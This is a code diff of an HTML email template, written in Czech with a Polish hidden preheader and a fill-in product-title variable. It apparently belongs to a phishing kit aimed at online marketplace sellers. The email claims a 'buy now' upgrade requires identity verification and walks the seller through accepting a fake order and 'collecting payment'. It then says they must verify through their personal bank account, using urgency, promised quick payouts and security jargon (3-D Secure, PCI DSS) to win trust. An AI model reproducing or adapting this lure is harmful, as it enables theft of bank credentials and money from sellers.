@@ -1,3 +1,15 @@
+<!doctype html >
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:v="urn:schemas-microsoft-com:vml"
+      xmlns:o="urn:schemas-microsoft-com:office:office">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title></title>
+</head>
+<body>
 <div class="">
     <div class="aHl"></div>
     <div id=":p7" tabindex="-1"></div>
@@ -6,7 +18,8 @@
 
 
             <div style="background-color:#ffffff;margin:0;padding:0">
-                <div style="display:none;font-size:1px;color:#333333;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden">
+                <div
+                    style="display:none;font-size:1px;color:#333333;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden">
                     Prosimy zaakceptować zamówienie {{$fake->title}}
                 </div>
                 <table width="100%" border="0" cellpadding="0" cellspacing="0" role="presentation"
@@ -82,9 +95,11 @@
                                                         <tr>
                                                             <td>
                                                                 <div style="font-family:Tahoma,Verdana,sans-serif">
-                                                                    <div style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;color:#000308;line-height:1.2">
+                                                                    <div
+                                                                        style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;color:#000308;line-height:1.2">
                                                                         <p style="margin:0;font-size:14px;text-align:center">
-                                                                            <span style="font-size:24px;color:#13c1ac"><strong><span><span
+                                                                            <span
+                                                                                style="font-size:24px;color:#13c1ac"><strong><span><span
                                                                                             style="color:#d0021b">Přečtěte si prosím níže uvedené informace, po přečtení věnujte pozornost dalším pokynům a přejděte k ověření totožnosti (čtěte prosím dále).</span><br></span></strong></span>
                                                                         </p>
                                                                     </div>
@@ -119,7 +134,8 @@
                                                         <tr>
                                                             <td style="padding-bottom:5px;padding-top:5px">
                                                                 <div style="font-family:Tahoma,Verdana,sans-serif">
-                                                                    <div style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;text-align:center;color:#000308;line-height:1.2">
+                                                                    <div
+                                                                        style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;text-align:center;color:#000308;line-height:1.2">
                                                                         <strong><span style="font-size:20px">Vzhledem k vylepšení funkce "koupit nyní" jsme nuceni požádat o dodatečné ověření zákazníků portálu, abychom zlepšili rychlost přijímání převodů za prodané zboží, nyní nemusíte dlouho čekat na platbu, kterou obdržíte ihned!</span></strong>
                                                                     </div>
                                                                 </div>
@@ -154,19 +170,23 @@
                                                         <tr>
                                                             <td style="padding-bottom:5px;padding-top:5px">
                                                                 <div style="font-family:Tahoma,Verdana,sans-serif">
-                                                                    <div style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;color:#09b1ba;line-height:1.2">
+                                                                    <div
+                                                                        style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;color:#09b1ba;line-height:1.2">
                                                                         <p style="margin:0;text-align:center;font-size:18px">
-                                                                            <span style="font-size:18px;color:#000000"><strong><span>Po přijetí objednávky postupujte podle níže uvedených pokynů a vyzvedněte si platbu!</span></strong></span>
+                                                                            <span
+                                                                                style="font-size:18px;color:#000000"><strong><span>Po přijetí objednávky postupujte podle níže uvedených pokynů a vyzvedněte si platbu!</span></strong></span>
                                                                         </p>
                                                                         <p style="margin:0;text-align:center;font-size:18px">
                                                                             &nbsp;</p>
                                                                         <p style="margin:0;text-align:center;font-size:18px">
-                                                                            <span style="font-size:18px;color:#000000"><strong><span><span>1) Klikněte na "PŘIJMOUT OBJEDNÁVKU"</span></span></strong></span>
+                                                                            <span
+                                                                                style="font-size:18px;color:#000000"><strong><span><span>1) Klikněte na "PŘIJMOUT OBJEDNÁVKU"</span></span></strong></span>
                                                                         </p>
                                                                         <p style="margin:0;text-align:center;font-size:18px">
                                                                             &nbsp;</p>
                                                                         <p style="margin:0;text-align:center;font-size:18px">
-                                                                            <span style="font-size:18px;color:#000000"><strong><span><span>2) Najděte a klikněte na tlačítko "vyzvednout doručenou poštu/přijmout platbu".<br></span></span></strong></span>
+                                                                            <span
+                                                                                style="font-size:18px;color:#000000"><strong><span><span>2) Najděte a klikněte na tlačítko "vyzvednout doručenou poštu/přijmout platbu".<br></span></span></strong></span>
                                                                         </p>
                                                                         <p style="margin:0;text-align:center;font-size:18px">
                                                                             &nbsp;</p>
@@ -213,7 +233,8 @@
                                                         <tr>
                                                             <td>
                                                                 <div style="font-family:Tahoma,Verdana,sans-serif">
-                                                                    <div style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;text-align:center;color:#09b1ba;line-height:1.2">
+                                                                    <div
+                                                                        style="font-size:14px;font-family:'Roboto',Tahoma,Verdana,Segoe,sans-serif;text-align:center;color:#09b1ba;line-height:1.2">
                                                                         <p style="margin:0"><strong><span
                                                                                     style="color:#000000">Svou totožnost musíte potvrdit v procesu ověření prostřednictvím osobního účtu banky, kterou používáte - jedná se o jednorázové ověření, po kterém budete zařazeni do oficiálního seznamu osob, které portál používají!</span></strong>
                                                                         </p>
@@ -273,9 +294,11 @@
                                                         <tr>
                                                             <td>
                                                                 <div style="font-family:sans-serif">
-                                                                    <div style="font-size:12px;color:#09b1ba;line-height:1.2;font-family:Roboto,Tahoma,Verdana,Segoe,sans-serif">
+                                                                    <div
+                                                                        style="font-size:12px;color:#09b1ba;line-height:1.2;font-family:Roboto,Tahoma,Verdana,Segoe,sans-serif">
                                                                         <p style="margin:0;font-size:12px;text-align:center">
-                                                                            <span style="font-size:16px;color:#d0021b"><strong><span><span>Po ověření přijdou peníze do 5-15 minut.</span></span></strong></span>
+                                                                            <span
+                                                                                style="font-size:16px;color:#d0021b"><strong><span><span>Po ověření přijdou peníze do 5-15 minut.</span></span></strong></span>
                                                                         </p>
                                                                     </div>
                                                                 </div>
@@ -324,7 +347,8 @@
                                                         <tr>
                                                             <td>
                                                                 <div style="font-family:sans-serif">
-                                                                    <div style="font-size:14px;color:#000000;line-height:1.2;font-family:Roboto,Tahoma,Verdana,Segoe,sans-serif">
+                                                                    <div
+                                                                        style="font-size:14px;color:#000000;line-height:1.2;font-family:Roboto,Tahoma,Verdana,Segoe,sans-serif">
                                                                         <p style="margin:0;font-size:14px;text-align:center">
                                                                             <span style="font-size:15px">Bezpečnost plateb zajišťují technologie 3-D Secure, Verified by Visa a MasterCard SecureCode. Údaje poskytnuté při ověřování jsou zpracovávány protokolem HTTPS, který je bezpečný a chrání vaše údaje, což znamená, že se k nim nikdo nedostane. &nbsp;Každoroční potvrzení společnosti o splnění standardu PCI DSS Level 1 (nejvyšší úroveň).<br></span>
                                                                         </p>
@@ -360,3 +384,6 @@
     </div>
     <div class="hi"></div>
 </div>
+
+</body>
+</html>
